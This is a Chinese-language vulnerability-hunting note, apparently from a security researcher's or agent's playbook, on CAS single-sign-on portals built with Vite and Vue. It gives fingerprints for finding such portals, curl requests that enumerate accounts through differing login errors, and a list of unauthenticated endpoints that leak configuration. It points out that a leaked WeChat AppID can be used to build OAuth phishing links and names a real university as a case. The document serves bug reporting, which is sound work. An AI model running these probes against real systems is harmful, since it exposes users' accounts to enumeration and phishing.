# CAS Vite SPA 一网通办漏洞模式 (2026-06-02)

## 触发条件
目标使用Vite SPA + Vue.js构建的CAS一网通办系统(非标准Apereo CAS)。特征: `/authserver/login`返回SPA页面(含`import.meta.url`), JS bundle在`/assets/index.*.js`。

## 指纹
- URL: `/#/login?loginType=cas` (SPA路由)
- Header: `YWTBSESSIONID` cookie (domain=.cuit.edu.cn)
- JS: `wxLogin.js` (微信登录), Vue.js 2.x, Vite构建
- API前缀: `/api/base/*`, `/api/user/*`

## 漏洞模式

### 1. 登录接口用户枚举 [中危]
```
POST /api/base/login
Content-Type: application/json
{"username":"admin","password":"任意"}
```
- 已存在账号: `{"msg":"登录失败(在校园网外的地方不支持账号密码登录，请使用微信扫码登录！)","code":500}`
- 不存在账号: `{"msg":"账号不存在","code":500}`
- 注意: 密码重置接口`/api/base/retrieve/check`返回统一"登录账号不存在"(不可枚举)

### 2. API未授权信息泄露 [中危]
无需认证即可访问:
- `/api/base/apps` — 应用列表+角色+分组(14KB)
- `/api/base/stats/dept` — 部门统计(部门ID+名称+办事数量)
- `/api/base/index_apps` — 完整应用配置(66KB)
- `/api/base/register/config` — 注册配置+匿名token
- `/api/base/wx/qr_code` — 微信AppID+state
- `/api/base/config` — 系统配置

需认证(401): `/api/user/*` 全系列

### 3. 微信OAuth信息泄露 [低危]
- `/api/base/wx/qr_code` 返回AppID和state参数
- AppID可用于构造OAuth钓鱼URL

## 实战案例
- cuit.edu.cn (成都信息工程大学): ywtb.cuit.edu.cn, user.cuit.edu.cn, notice.cuit.edu.cn 共用同一套CAS系统
- 自动化脚本: `/root/.hermes/scripts/auto-vuln-scan.py` 内置`cas_authserver`指纹

## 报告模板
```
标题: XXX大学一网通办CAS登录接口存在用户枚举漏洞
URL: https://xxx.edu.cn/api/base/login
复现:
curl -sk 'https://xxx.edu.cn/api/base/login' -X POST -H 'Content-Type: application/json' -d '{"username":"admin","password":"***"}'
返回: {"msg":"登录失败(在校园网外的地方不支持账号密码登录，请使用微信扫码登录！)","code":500}
curl -sk 'https://xxx.edu.cn/api/base/login' -X POST -H 'Content-Type: application/json' -d '{"username":"nonexistent999","password":"***"}'
返回: {"msg":"账号不存在","code":500}
```
